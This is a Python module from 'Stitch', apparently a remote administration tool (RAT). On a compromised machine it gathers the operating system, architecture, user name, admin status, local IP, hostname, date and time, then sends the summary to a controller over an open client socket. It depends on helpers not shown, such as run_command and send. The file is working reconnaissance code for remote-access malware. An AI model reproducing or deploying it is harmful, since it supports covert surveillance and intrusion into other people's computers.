# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import ctypes
import socket
import platform
import subprocess
from time import strftime, sleep

hour = int(strftime("%H"))
am_pm = "AM"
if hour > 12:
    hour = str(hour - 12)
    am_pm = "PM"
try:
    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip =(s.getsockname()[0])
s.close()
if win_client():
    os.chdir(os.path.join(os.getenv('userprofile'),'Desktop'))
    user = os.getenv('username')
    arch = run_command('wmic os get osarchitecture').split('\n')[1]
else:
    user = run_command("whoami").strip().replace("\\","-")
    arch = run_command('uname -m')
    if 'x86_64' in arch:
        arch = '64-bit'
    else:
        arch = '32-bit'
time = "{}{}{}".format(str(hour),strftime(":%M:%S "),am_pm)
date = strftime("%m/%d/%Y")
stinfo = (  "   OS{8:25}: {0}"
            "\n   Architecture{8:15}: {1}"
            "\n   User{8:23}: {2}"
            "\n   Admin Rights{8:15}: {3}"
            "\n   Network IP{8:17}: {4}"
            "\n   Network Name{8:15}: {5}\n"
            "\n   Date{8:23}: {6}"
            "\n   Time{8:23}: {7}\n"
).format(platform.platform(),arch,user,str(is_admin),ip,platform.node(),date,time," ")
send(client_socket,stinfo)
